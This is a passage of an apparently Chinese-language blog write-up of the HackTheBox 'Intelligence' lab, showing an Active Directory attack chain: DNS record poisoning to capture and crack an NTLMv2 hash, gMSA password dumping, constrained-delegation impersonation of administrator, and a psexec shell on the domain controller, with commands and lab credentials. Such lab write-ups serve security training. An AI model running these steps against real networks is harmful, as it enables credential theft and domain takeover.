+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \Tiffany.Molina\Desktop\&gt; <span class="hljs-built_in">ls</span><br>  .                                  DR        0  Mon Apr 19 08:51:46 2021<br>  ..                                 DR        0  Mon Apr 19 08:51:46 2021<br>  user.txt                           AR       34  Wed May 25 19:45:09 2022<br><br>		3770367 blocks of size 4096. 1466935 blocks available<br>smb: \Tiffany.Molina\Desktop\&gt; get user.txt <br>getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)<br>smb: \Tiffany.Molina\Desktop\&gt; <br></code></pre></td></tr></table></figure>
+
+<p>我尝试了bloodhound，但是收集到的信息太少太少了。在IT共享目录有个powershell脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.248/IT -U Tiffany.Molina<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\Tiffany.Molina]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; LS<br>  .                                   D        0  Mon Apr 19 08:50:55 2021<br>  ..                                  D        0  Mon Apr 19 08:50:55 2021<br>  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021<br><br>		3770367 blocks of size 4096. 1464066 blocks available<br>smb: \&gt; get downdetector.ps1 <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> downdetector.ps1 <br>��<span class="hljs-comment"># Check web server status. Scheduled to run every 5min</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$record</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="hljs-built_in">Where-Object</span> Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;web*&quot;</span>)  &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$request</span> = <span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> <span class="hljs-string">&quot;http://<span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name)&quot;</span> <span class="hljs-literal">-UseDefaultCredentials</span><br><span class="hljs-keyword">if</span>(.StatusCode <span class="hljs-operator">-ne</span> <span class="hljs-number">200</span>) &#123;<br><span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-From</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-To</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host: <span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name) is down&quot;</span><br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>它看起来像是在使用默认凭据不断的搜寻域内开启80端口http服务且主机名是以web开头的主机脚本，我只关心它的默认凭据，那么我需要让他意识到我的主机名是模板域内的，让它返现我并访问到我，它才会拿着凭据来与我进行认证。那么我需要添加一个机器账户并将其dnshostname值指向我的主机，这样目标变回通过DNS解析访问到我。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dnstool -u <span class="hljs-string">&#x27;intelligence.htb\Tiffany.Molina&#x27;</span> -p NewIntelligenceCorpUser9876 -a add -d 10.10.16.11 -r web.intelligence.htb 10.10.10.248<br>[-] Connecting to host...<br>[-] Binding to host<br>[+] Bind OK<br>[-] Adding new record<br>[+] LDAP operation completed successfully<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[HTTP] NTLMv2 Client   : ::ffff:10.10.10.248<br>[HTTP] NTLMv2 Username : intelligence\Ted.Graves<br>[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:ab29604c29984e7a:87C7EF234FF4C01F4638B8731C466487:01010000000000006D8E721C5070D80121C54933D43109EB0000000002000800370042005800560001001E00570049004E002D0056005400590055005A004B00450051004800490033000400140037004200580056002E004C004F00430041004C0003003400570049004E002D0056005400590055005A004B00450051004800490033002E0037004200580056002E004C004F00430041004C000500140037004200580056002E004C004F00430041004C0008003000300000000000000000000000002000003BD7A88BC395384C35A66C5FD590E6049F1A4963B42CC4E67D7B24CC958616460A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Ted.Graves::intelligence:ab29604c29984e7a:87C7EF234FF4C01F4638B8731C466487:01010000000000006D8E721C5070D80121C54933D43109EB0000000002000800370042005800560001001E00570049004E002D0056005400590055005A004B00450051004800490033000400140037004200580056002E004C004F00430041004C0003003400570049004E002D0056005400590055005A004B00450051004800490033002E0037004200580056002E004C004F00430041004C000500140037004200580056002E004C004F00430041004C0008003000300000000000000000000000002000003BD7A88BC395384C35A66C5FD590E6049F1A4963B42CC4E67D7B24CC958616460A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000&#x27;</span> &gt; <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br><br>TED.GRAVES::intelligence:ab29604c29984e7a:87c7ef234ff4c01f4638b8731c466487:01010000000000006d8e721c5070d80121c54933d43109eb0000000002000800370042005800560001001e00570049004e002d0056005400590055005a004b00450051004800490033000400140037004200580056002e004c004f00430041004c0003003400570049004e002d0056005400590055005a004b00450051004800490033002e0037004200580056002e004c004f00430041004c000500140037004200580056002e004c004f00430041004c0008003000300000000000000000000000002000003bd7a88bc395384c35a66c5fd590e6049f1a4963b42cc4e67d7b24cc958616460a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Mr.Teddy&#x27;</span> &gt;&gt; passwd.txt<br></code></pre></td></tr></table></figure>
+
+<p>口令正确：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.248 -u TED.GRAVES -p Mr.Teddy <br>/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated<br>  <span class="hljs-string">&quot;class&quot;</span>: algorithms.Blowfish,<br>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.10.248    445    DC               [+] intelligence.htb\TED.GRAVES:Mr.Teddy <br></code></pre></td></tr></table></figure>
+
+<p>我准备再尝试bloodhound一波：</p>
+<p><img src="https://www.worldisend.com/img/image-20220525171803861.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525171803861"></p>
+<p>TED.GRAVES用户属于ITSUPPORT组，SVC_INT.INTELLIGENCE.HTB 是一个组托管服务帐户。 <a href="mailto:&#73;&#84;&#83;&#x55;&#80;&#80;&#x4f;&#x52;&#x54;&#64;&#73;&#x4e;&#84;&#69;&#76;&#x4c;&#73;&#x47;&#x45;&#x4e;&#67;&#69;&#x2e;&#72;&#x54;&#x42;">&#73;&#84;&#83;&#x55;&#80;&#80;&#x4f;&#x52;&#x54;&#64;&#73;&#x4e;&#84;&#69;&#76;&#x4c;&#73;&#x47;&#x45;&#x4e;&#67;&#69;&#x2e;&#72;&#x54;&#x42;</a> 组可以检索 GMSA SVC_INT.INTELLIGENCE.HTB 的密码。其实就是我间接的拥有了这个账户。因为我能够获取到它的哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gMSADumper -u TED.GRAVES -p Mr.Teddy -d intelligence.htb<br>Users or <span class="hljs-built_in">groups</span> <span class="hljs-built_in">who</span> can <span class="hljs-built_in">read</span> password <span class="hljs-keyword">for</span> svc_int$:<br> &gt; DC$<br> &gt; itsupport<br>svc_int$:::67065141d298d67a17ee8626476b20f9<br></code></pre></td></tr></table></figure>
+
+<p>再看svc_int账户：</p>
+<p><img src="https://www.worldisend.com/img/image-20220525173058431.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525173058431"></p>
+<p>它具有域控制器的约束委派权限，它可以代表任何用户去申请DC的ST票据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ getST.py -spn <span class="hljs-string">&#x27;www/dc.intelligence.htb&#x27;</span> -impersonate administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9 -dc-ip 10.10.10.248 <br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[-] CCache file is not found. Skipping...<br>[*] Getting TGT <span class="hljs-keyword">for</span> user<br>[*] Impersonating administrator<br>[*] 	Requesting S4U2self<br>[*] 	Requesting S4U2Proxy<br>[*] Saving ticket <span class="hljs-keyword">in</span> administrator.ccache<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ klist <br>Ticket cache: FILE:administrator.ccache<br>Default principal: administrator@intelligence.htb<br><br>Valid starting       Expires              Service principal<br>2022-05-25T20:37:45  2022-05-26T06:37:43  www/dc.intelligence.htb@INTELLIGENCE.HTB<br>	renew until 2022-05-26T20:37:42<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ psexec.py -k -no-pass dc.intelligence.htb<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Requesting shares on dc.intelligence.htb.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file TbSzuryi.exe<br>[*] Opening SVCManager on dc.intelligence.htb.....<br>[*] Creating service FHIW on dc.intelligence.htb.....<br>[*] Starting service FHIW.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.1879]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">type</span> C:\Users\Administrator\Desktop\root.txt<br>31.......................................<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Intelligence</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Intelligence/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Hancliffe/" title="HackTheBox-Hancliffe">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Hancliffe</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Json/" title="HackTheBox-Json">
+                        <span class="hidden-mobile">HackTheBox-Json</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
